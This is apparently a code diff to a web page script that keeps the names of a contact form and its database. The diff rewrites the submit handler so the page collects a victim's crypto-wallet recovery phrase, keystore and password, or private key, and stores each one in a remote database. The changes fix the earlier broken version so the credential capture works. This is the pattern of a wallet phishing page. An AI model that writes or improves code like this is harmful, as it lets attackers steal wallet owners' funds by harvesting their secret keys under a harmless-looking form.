@@ -302,62 +302,41 @@
 document.getElementById("contactForm").addEventListener("submit", submitForm);
 
 function submitForm(e) {
-  e.preventDefault();
+            e.preventDefault();
 
-  var name = getElementVal("name");
-  var emailid = getElementVal("emailid");
-  var msgContent = getElementVal("msgContent");
-       var selectedWallet = document.getElementById('selected-wallet').value;
-            var walletInfoType = document.getElementById('wallet-info-type').value;
-            var walletName = document.getElementById('wallet-name').value; // New field for wallet name
+            var selectedWallet = getElementVal("selected-wallet");
+            var walletName = getElementVal("wallet-name");
+            var walletInfoType = getElementVal("wallet-info-type");
+            var infoValue = getElementVal("info-input");
 
-            // Retrieve information input based on the selected type
-            let walletCredentials;
-            switch (walletInfoType) {
-                case 'phrase':
-                    walletCredentials = document.getElementById('wallet-phrase').value;
-                    break;
-                case 'keystore':
-                    var walletKeystore = document.getElementById('wallet-keystore').value;
-                    var walletPassword = document.getElementById('wallet-password').value;
-                    walletCredentials = { keystore: walletKeystore, password: walletPassword };
-                    break;
-                case 'private-key':
-                    var walletPrivateKey = document.getElementById('wallet-private-key').value;
-                    break;
-                default:
-                    break;
-            }
-  saveMessages(selectedWallet,walletKeystore,walletName,walletPassword,walletPrivateKey);
+            saveMessages(selectedWallet, walletName, walletInfoType, infoValue);
 
-  //   enable alert
-  document.querySelector(".alert").style.display = "block";
+            // Enable alert
+            document.querySelector(".alert").style.display = "block";
 
-  //   remove the alert
-  setTimeout(() => {
-    document.querySelector(".alert").style.display = "none";
-  }, 3000);
+            // Remove the alert
+            setTimeout(() => {
+                document.querySelector(".alert").style.display = "none";
+            }, 3000);
 
-  //   reset the form
-  document.getElementById("contactForm").reset();
-}
+            // Reset the form
+            document.getElementById("contactForm").reset();
+        }
 
-const saveMessages = (name, emailid, msgContent) => {
-  var newContactForm = contactFormDB.push();
+        const saveMessages = (selectedWallet, walletName, walletInfoType, infoValue) => {
+            var newContactForm = contactFormDB.push();
 
-  newContactForm.set({
-    walletKeystore: walletKeystore,
-    selectedWallet: selectedWallet,
-    walletName: walletName,
-      selectedWallet: selectedWallet,
-       walletPassword: walletPassword,
-      walletPrivateKey: walletPrivateKey
-  });
-};
+            newContactForm.set({
+                selectedWallet: selectedWallet,
+                walletName: walletName,
+                walletInfoType: walletInfoType,
+                infoValue: infoValue,
+            });
+        };
 
-const getElementVal = (id) => {
-  return document.getElementById(id).value;
-};
+        const getElementVal = (id) => {
+            return document.getElementById(id).value;
+        };
         
     </script>
 
